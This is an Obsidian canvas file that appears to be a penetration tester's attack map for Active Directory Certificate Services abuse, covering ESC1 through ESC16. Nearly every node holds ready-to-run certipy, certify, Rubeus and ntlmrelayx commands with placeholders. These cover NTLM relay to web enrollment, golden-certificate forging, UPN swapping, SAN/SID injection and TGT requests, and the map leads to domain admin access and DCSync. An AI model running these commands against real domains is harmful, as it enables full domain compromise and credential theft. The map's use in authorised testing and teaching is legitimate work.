{
	"nodes":[
		{"id":"5ef2efcfb4d714b0","type":"group","x":-780,"y":-380,"width":3820,"height":8580,"color":"#7806a0","label":"ADCS ABUSE"},
		{"id":"b32a3f5c843c8f71","type":"group","x":-2080,"y":3139,"width":1080,"height":783,"label":"NO CREDENTIALS"},
		{"id":"0241841ff1fac097","type":"group","x":3440,"y":4839,"width":1080,"height":763,"color":"1","label":"GOT DOMAIN ADMIN ACCESS"},
		{"id":"7e75f1e3571aa990","type":"group","x":3440,"y":2759,"width":1080,"height":760,"color":"6","label":"LATERAL MOVE"},
		{"id":"37db19af7351d721","type":"group","x":3440,"y":3719,"width":1080,"height":760,"color":"#324bff","label":"DACL ABUSE"},
		{"id":"d4bf82cb714bdf15","type":"group","x":3440,"y":1799,"width":1080,"height":760,"color":"#7806a0","label":"ADCS ABUSE"},
		{"id":"66b251b4112cd3df","type":"text","text":"# Enumeration \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/#theory\n\n\n>[!example] Tools\n>- [certify](https://github.com/GhostPack/Certify)\n>- [certipy](https://github.com/ly4k/Certipy)\n>- [ldeep](https://github.com/franc-pentest/ldeep)\n\n```shell\n# Find vulnerable certificate templates with certipy\n⚪ certipy find -u '<user>'@'<domain>' -p '<password>' -dc-ip '<dc_ip>'\n⚫ certutil -v -dsTemplate\n🔵 certify.exe find [ /vulnerable]\n⚪ ldeep ldap -u '<user>' -p '<password>' -d '<domain>' -s '<dc_ip>' templates\n# Get PKI objects information\n⚫ certify.exe pkiobjects\n# Display CA information\n⚫ certutil -TCAInfo\n⚫ certify.exe cas\n```","x":160,"y":-288,"width":2000,"height":640},
		{"id":"85e1edf8556a947b","type":"text","text":"# Web Enrollment Is Up \n## ESC8\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#web-endpoint-esc8\n\n\n>[!example] Tools\n>- [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [certipy](https://github.com/ly4k/certipy)\n>- [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)\n\n```shell\n# Using ntlmrelayx to conduct the esc8 escalation\n🟣 ntlmrelayx.py -t http://'<dc_ip>'/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController\n# Request a TGT\n⚪ gettgtpkinit.py -pfx-base64 '$(cat cert.b64)' '<domain>'/'<dc_name>'$ '<ccache_file>'\n🔵 Rubeus.exe asktgt /user:'<user>' /certificate:'<base64-certificate>' /ptt\n# using certipy \n⚪ certipy relay -target http://'<ip_ca>'\n⚪ certipy auth -pfx '<certificate>' -dc-ip '<dc_ip>'\n```","x":160,"y":412,"width":2000,"height":680},
		{"id":"fb6ca3dc0dfae897","type":"text","text":"# Vulnerable template","x":2344,"y":-61,"width":371,"height":50,"color":"#7806a0"},
		{"id":"d5ccdef2de23c209","type":"text","text":"# Vulnerable CA","x":2344,"y":0,"width":331,"height":61,"color":"#7806a0"},
		{"id":"208d70dc692fd70c","type":"text","text":"# Misconfigured ACL","x":2344,"y":78,"width":331,"height":61,"color":"#7806a0"},
		{"id":"db3c367cce66e194","type":"text","text":"# Vulnerable PKI Object AC","x":2344,"y":160,"width":431,"height":50,"color":"#7806a0"},
		{"id":"c05bf74b3905c585","type":"text","text":"# Web enrollement","x":2344,"y":-140,"width":331,"height":61,"color":"#7806a0"},
		{"id":"418b5cd7b7a8439b","type":"text","text":"# Pass the ticket","x":2320,"y":727,"width":335,"height":50,"color":"6"},
		{"id":"0d33f83a3ce17962","type":"text","text":"# GOT DOMAIN ADMIN ACCESS","x":2320,"y":660,"width":480,"height":50,"color":"1"},
		{"id":"5eab9fdc9ed1e8a2","type":"text","text":"# DCSYNC","x":2320,"y":800,"width":335,"height":50,"color":"#324bff"},
		{"id":"e62e1ebd8ee8b0bc","type":"file","file":"INTERACTIVE-MAP.canvas","x":-2000,"y":3242,"width":920,"height":600},
		{"id":"6b131f9bb3946b96","type":"text","text":"# Misconfigured ACL\n## ESC4 (Write privilege over a certificate template)\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-templates-esc4\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n\n```shell\n# using certipy \n⚪ certipy template -u '<user>'@'<domain>' -p '<password>' -template '<vuln_template>' -save-old -debug\n# restore template\n⚪ certipy template -u '<user>'@'<domain>' -p '<password>' -template '<vuln_template>' -configuration '<template>.json'\n\n```\n\n---\n## ESC7 \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/access-controls#certificate-authority-esc7\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n\n```shell\n# Manage CA\n⚪ certipy ca -ca '<ca_name>' -add-officer  '<user>' -username '<user>@<domain>' -password '<password>' -dc-ip '<dc_ip>' -target-ip '<target_ip>'\n# Manage certificate if error, save private key and get issue request\n⚪ certipy ca  -ca '<ca_name>' -enable-template '<ecs1_vuln_template>' -username '<user>@<domain>' -password '<password>'\n# Issue request\n⚪ certipy  req -username '<user>@<domain>' -password '<password>' -ca '<ca_name>' -template '<vulnerable template name>' -upn '<target_user>'\n# Issue request\n⚪ certipy ca -u '<user>@<domain>' -p '<password>' -ca '<ca_name>' -issue-request '<request_id>'\n⚪ certipy req -u '<user>@<domain>' -p '<password>'  -ca '<ca_name>' -retreive '<request_id>'\n```\n\n","x":160,"y":3532,"width":2000,"height":1100},
		{"id":"a85b01e4832f98a9","type":"text","text":"# Vulnerable PKI Object access control\n## ESC5 \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/access-controls#other-objects-esc5\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n\n```shell\n# Golden certificate \n⚪ certipy ca -backup -u '<user>@<domain>' -hashes '<hash_nt>' -ca '<ca_name>' -debug -target '<ca_ip>'\n# restore template\n⚪ certipy forge -ca-pfx '<adcs>.pfx' -upn 'administrator@<domain>'\n# Vulnerable acl on PKI \n```\n\n","x":160,"y":4692,"width":2000,"height":540},
		{"id":"581302a77f9d8d08","type":"text","text":"# Misconfigured Certificate Authority\n## ESC6 \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-authority#theory\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n- **Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication\nREAD ESC1**\n--- \n\n## ESC11\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#rpc-endpoint-esc11\n\n\n>[!example] Tools\n>- [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\n>- [Rubeus](https://github.com/GhostPack/Rubeus)\n>- [certipy](https://github.com/ly4k/certipy)\n>- [gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)\n\n","x":160,"y":5292,"width":2000,"height":860},
		{"id":"b8458440512a077a","type":"text","text":"# ESC7 Manage certificate","x":2360,"y":4057,"width":431,"height":50,"color":"#7806a0"},
		{"id":"a4d6c33c96f344ea","type":"text","text":"# Pass the certificate","x":2360,"y":4137,"width":380,"height":50,"color":"6"},
		{"id":"b5ec80dcb7df8c46","type":"text","text":"# ACL","x":2360,"y":4900,"width":335,"height":50,"color":"#324bff"},
		{"id":"c7a89b5e1f155972","type":"text","text":"# Pass the certificate","x":2360,"y":4980,"width":380,"height":50,"color":"6"},
		{"id":"0c642b33c605e4c9","type":"text","text":"# DCSYNC","x":2360,"y":5672,"width":335,"height":50,"color":"#324bff"},
		{"id":"66e4daca99bfe9d0","type":"text","text":"# Pass the certificate (only Schannel)","x":2360,"y":2440,"width":600,"height":50,"color":"6"},
		{"id":"5479bd1ddd51b583","type":"text","text":"# Pass the certificate (PKINIT)","x":2360,"y":2340,"width":500,"height":50,"color":"6"},
		{"id":"41c39b4309ad018a","type":"text","text":"# Pass the certificate","x":2360,"y":2140,"width":380,"height":50,"color":"6"},
		{"id":"03d3192ae6d922c3","type":"text","text":"# ESC3","x":2360,"y":2240,"width":431,"height":50,"color":"#7806a0"},
		{"id":"d24b3a7dd70482b0","type":"text","text":"# ESC1","x":2360,"y":5602,"width":431,"height":50,"color":"#7806a0"},
		{"id":"77f9243dfc3c2357","type":"text","text":"# GOT DOMAIN ADMIN ACCESS","x":2360,"y":5742,"width":480,"height":50,"color":"1"},
		{"id":"785251ec91b5d7f4","type":"text","text":"# Pass the ticket","x":2360,"y":5822,"width":335,"height":50,"color":"6"},
		{"id":"7a42f2c30c11cda7","type":"text","text":"# Misconfigured Certificate Template\n## ESC1\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#template-allows-san-esc1\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n>- [certify](https://github.com/GhostPack/Certify)\n\n\n```shell\n# Using ntlmrelayx to conduct the esc8 escalation\n🟣 ntlmrelayx.py -t http://'<dc_ip>'/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController\n# Request a TGT\n⚪ gettgtpkinit.py -pfx-base64 '$(cat cert.b64)' '<domain>'/'<dc_name>'$ '<ccache_file>'\n🔵 Rubeus.exe asktgt /user:'<user>' /certificate:'<base64-certificate>' /ptt\n# using certipy \n⚪ certipy relay -target http://'<ip_ca>'\n⚪ certipy auth -pfx '<certificate>' -dc-ip '<dc_ip>'\n```\n\n---\n## ESC2 \n\n### Check esc3 below\n\n---\n\n## ESC3\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#certificate-agent-eku-esc3\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n>- [certify](https://github.com/GhostPack/Certify)\n\n```shell\n# Using certify to conduct the esc3 escalation\n🔵 certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\"\n🔵 certify.exe request request /ca:<server>\\<ca-name> /template:<template>  /onbehalfof:<domain>\\<user> /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]\n# Using certipy to conduct the esc3 escalation\n⚪certipy req -u '<user>'@'<domain>' -p '<password>' -target '<ca_server>' -template '<vulnerable template name>'  -ca '<ca_name>'\n⚪certipy req -u '<user>'@'<domain>' -p '<password>' -target '<ca_server>' -template  '<vulnerable template name>'  -ca '<ca_name>' -on-behalf-of '<domain>\\<user>' -pfx '<cert>'\n```\n\n---\n\n## ESC13\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc13-issuance-policiy-with-privileged-group-linked\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n>- [certify](https://github.com/GhostPack/Certify)\n\n```shell\n# Using certify to conduct the esc13 escalation\n🔵 certify.exe request /ca:<server>\\<ca-name> /template:\"<vulnerable template name>\"\n# Using certipy to conduct the esc13 escalation\n⚪ certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>'  -template '<vulnerable template name>' -ca '<ca_name>'\n```\n\n---\n\n## ESC15\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc15-CVE-2024-49019-arbitrary-application-policy\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n```shell\n# Using certipy to conduct the esc15 escalation # with pull request 228 on certipy's repo\n⚪ certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>' -template '<version 1 template with enrolee flag>' -ca '<ca_name>' -upn '<target_user>@<domain>' --application-policies 'Client Authentication'\n# Using certipy to conduct the esc15 escalation # with pull request 228 on certipy's repo\n⚪ certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>' -template '<version 1 template with enrolee flag>' -ca '<ca_name>' --application-policies 'Certificate Request Agent'\n\n⚪ certipy req -u '<user>@<domain>' -p '<password>' -target '<ca_server>' -template '<vulnerable template name>' -ca '<ca_name>' -on-behalf-of '<domain>\\<user>' -pfx '<cert>'\n```\n\n","x":160,"y":1172,"width":2000,"height":2280},
		{"id":"796146c5152f9217","type":"file","file":"ATTACKS/ADCS ABUSE.canvas","x":3520,"y":1877,"width":920,"height":600,"color":"#7806a0"},
		{"id":"f30e914a3e647bbf","type":"file","file":"ATTACKS/LATERAL MOVE.canvas","x":3520,"y":2841,"width":920,"height":600,"color":"6"},
		{"id":"7ac5035cb0afc467","type":"file","file":"ATTACKS/PERMISSIONS ABUSE.canvas","x":3520,"y":3799,"width":920,"height":600,"color":"#324bff"},
		{"id":"6baec6857148ef26","type":"file","file":"ATTACKS/GOT DOMAIN ADMIN ACCESS.canvas","x":3520,"y":4919,"width":920,"height":600,"color":"1"},
		{"id":"180ae15c839f6719","type":"text","text":"# ESC1","x":2360,"y":3977,"width":431,"height":50,"color":"#7806a0"},
		{"id":"2ea86bf221ce4034","type":"text","text":"# Abuse Certificate Mapping\n## ESC9/ESC10 (implicit) \n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#no-security-extension-esc9\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#weak-certificate-mapping-esc10\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n```shell\n⚪ certipy shadow auto -username '<accountA>@<domain>' -p '<passA>' -account '<accountB>'\n# ESC9/ESC10 (Case 1)\n⚪ certipy account update -username '<accountA>@<domain>' -password '<passA>' -user '<accountB>' -upn Administrator\n# ESC9\n⚪ certipy req  -username '<accountB>@<domain>' -hashes '<hashB>' -ca '<ca_name>' -template '<vulnerable template>'\n# ESC10 (case 1)\n⚪ certipy req  -username '<accountB>@<domain>' -hashes '<hashB>' -ca '<ca_name>' -template '<any template with client auth>'\n# ESC10 (Case 2)\n⚪ certipy account update -username '<accountA>@<domain>' -password '<passA>' -user '<accountB>' -upn '<dc_name$>@<domain>'\n# reset accountB UPN\n⚪ certipy account update -username '<accountA>@<domain>' -password '<passA>' -user '<accountB>' -upn '<accountB>@<domain>'\n```\n--- \n\n## ESC14 explicit\n\n>[!info] Theory\n>- https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-weak-explicit-mapping\n\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n\n```shell\n🛠️\n```\n\n---\n\n## ESC16 \n\n>[!NOTE] Theory\n>- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally\n>\n>_StrongCertifcateBindingEnforcement_ -> SCBE\n\n>[!example] Tools\n>- [certipy](https://github.com/ly4k/certipy)\n\n >[!warning] _accountA_ must have **globalWrite** on _accountB_\n\n### Pass-the-certificate (_SCBE_ ≠ 2)\n```shell\n# 1. Save the original UPN of accountB (optional)\ncertipy account -u '<accountA@domain>' -p '<passA>' -dc-ip <DC_IP> -user 'accountB' read\n# 2. Change accountB upn\ncertipy account -u '<accountA@domain>'> -p '<passA>' -upn 'administrator' -user 'accountB' update\n# 3. Request a certificate from accountB\ncertipy req -u '<accountB@domain>' -p '<passB>' -dc-ip <DC_IP> -target '<DC_FQDN>' -ca '<CA_NAME>' -template 'User'\n# 4. Revert the accountB upn to something else then administrator\ncertipy account -u '<accountA@domain>'> -p '<passA>' -upn 'somethingelse' -user 'accountB' update\n```\n### SAN SID inject (ECS6) + Pass the certificate (_SCBE_ = 2)\n```shell\n# Requesting a certificat with SAN injection\nceritpy req -u '<accountA@domain>' -p '<passA>' -dc-ip <DC_IP> -target '<DC_FQDN>' -ca '<CA_NAME>' -template 'User' -upn '<administrator@domain>' -sid '<administrator_sid>'\n```","x":160,"y":6200,"width":2000,"height":1880},
		{"id":"c6bb267f1dd9db9a","type":"text","text":"# ESC1","x":2400,"y":7040,"width":431,"height":50,"color":"#7806a0"},
		{"id":"25a5560315fd6aee","type":"text","text":"# Pass the certificate","x":2400,"y":7115,"width":431,"height":50,"color":"6"},
		{"id":"a4affc56463d23d6","type":"text","text":"# reset accountB UPN","x":2400,"y":7180,"width":431,"height":50,"color":"#7806a0"}
	],
	"edges":[
		{"id":"1e8ca28c4b2caad0","fromNode":"b32a3f5c843c8f71","fromSide":"right","toNode":"5ef2efcfb4d714b0","toSide":"left"},
		{"id":"7dcd2d2489c15053","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"f30e914a3e647bbf","toSide":"left","color":"6"},
		{"id":"5341d289f804fddd","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"6baec6857148ef26","toSide":"left","color":"1"},
		{"id":"48aab21cf4fc2dea","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"7ac5035cb0afc467","toSide":"left","color":"#324bff"},
		{"id":"c4a180a7bcc526cf","fromNode":"5ef2efcfb4d714b0","fromSide":"right","toNode":"796146c5152f9217","toSide":"left","color":"#7806a0"},
		{"id":"f4c0f3cd0a057af5","fromNode":"66b251b4112cd3df","fromSide":"right","toNode":"c05bf74b3905c585","toSide":"left"},
		{"id":"148cedb564a0cc6f","fromNode":"66b251b4112cd3df","fromSide":"right","toNode":"fb6ca3dc0dfae897","toSide":"left"},
		{"id":"7361507d933b6c33","fromNode":"66b251b4112cd3df","fromSide":"right","toNode":"d5ccdef2de23c209","toSide":"left"},
		{"id":"7ac02cda1ecad882","fromNode":"66b251b4112cd3df","fromSide":"right","toNode":"208d70dc692fd70c","toSide":"left"},
		{"id":"2b6592e7b18536b8","fromNode":"66b251b4112cd3df","fromSide":"right","toNode":"db3c367cce66e194","toSide":"left"},
		{"id":"d298c6b66d73566c","fromNode":"2ea86bf221ce4034","fromSide":"right","toNode":"c6bb267f1dd9db9a","toSide":"left"},
		{"id":"e0b13d68e19f468e","fromNode":"2ea86bf221ce4034","fromSide":"right","toNode":"25a5560315fd6aee","toSide":"left"},
		{"id":"f6420a47d943428f","fromNode":"2ea86bf221ce4034","fromSide":"right","toNode":"a4affc56463d23d6","toSide":"left"},
		{"id":"4f439bcb2bdf045b","fromNode":"581302a77f9d8d08","fromSide":"right","toNode":"d24b3a7dd70482b0","toSide":"left"},
		{"id":"f58048289dff6ed5","fromNode":"581302a77f9d8d08","fromSide":"right","toNode":"0c642b33c605e4c9","toSide":"left"},
		{"id":"e019bba198542e16","fromNode":"581302a77f9d8d08","fromSide":"right","toNode":"77f9243dfc3c2357","toSide":"left"},
		{"id":"6fda457ab0cec3f5","fromNode":"581302a77f9d8d08","fromSide":"right","toNode":"785251ec91b5d7f4","toSide":"left"},
		{"id":"93e393c55f08ec53","fromNode":"a85b01e4832f98a9","fromSide":"right","toNode":"b5ec80dcb7df8c46","toSide":"left"},
		{"id":"1d3eed9033eaa7df","fromNode":"a85b01e4832f98a9","fromSide":"right","toNode":"c7a89b5e1f155972","toSide":"left"},
		{"id":"41e0286a30da37c9","fromNode":"6b131f9bb3946b96","fromSide":"right","toNode":"180ae15c839f6719","toSide":"left"},
		{"id":"e598fa660f174284","fromNode":"6b131f9bb3946b96","fromSide":"right","toNode":"b8458440512a077a","toSide":"left"},
		{"id":"0cfa379eb278fd7e","fromNode":"6b131f9bb3946b96","fromSide":"right","toNode":"a4d6c33c96f344ea","toSide":"left"},
		{"id":"8fa10264d0783b84","fromNode":"7a42f2c30c11cda7","fromSide":"right","toNode":"41c39b4309ad018a","toSide":"left"},
		{"id":"b0a582a35490630a","fromNode":"7a42f2c30c11cda7","fromSide":"right","toNode":"03d3192ae6d922c3","toSide":"left"},
		{"id":"e55952e608334321","fromNode":"7a42f2c30c11cda7","fromSide":"right","toNode":"5479bd1ddd51b583","toSide":"left"},
		{"id":"2a1c4d2506e03724","fromNode":"7a42f2c30c11cda7","fromSide":"right","toNode":"66e4daca99bfe9d0","toSide":"left"},
		{"id":"1ee3af7991a96583","fromNode":"85e1edf8556a947b","fromSide":"right","toNode":"0d33f83a3ce17962","toSide":"left"},
		{"id":"f61fabb4db48b7d6","fromNode":"85e1edf8556a947b","fromSide":"right","toNode":"418b5cd7b7a8439b","toSide":"left"},
		{"id":"c2185194512f96cc","fromNode":"85e1edf8556a947b","fromSide":"right","toNode":"5eab9fdc9ed1e8a2","toSide":"left"}
	]
}